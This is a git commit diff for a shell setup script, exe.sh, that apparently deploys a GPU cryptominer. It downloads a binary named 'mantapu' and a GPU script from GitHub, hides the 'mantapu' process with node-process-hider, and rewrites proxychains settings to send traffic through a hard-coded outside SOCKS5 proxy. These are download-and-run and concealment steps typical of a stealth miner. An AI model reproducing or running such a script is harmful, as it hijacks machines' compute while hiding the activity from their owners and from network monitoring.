b02bcd82d40f8ce8d8b090959dd8c65e5ed28cf2
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-02-24 12:12:02 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -1,7 +1,11 @@
 #!/bin/sh
-sudo apt update
+sudo apt update -y
 sudo apt install screen -y
-screen -dmS gpu.sh ./gpu.sh 79 95
+apt install proxychains
+sed -i 's/socks4/socks5/' /etc/proxychains.conf
+sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
+sed -i 's/9050/10663/' /etc/proxychains.conf
+sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add mantapu
 wget https://github.com/d-crypto99/xroc3/raw/main/mantapu
 wget https://raw.githubusercontent.com/d-crypto99/xroc3/main/gpu-nvidia.sh
 chmod +x gpu-nvidia.sh
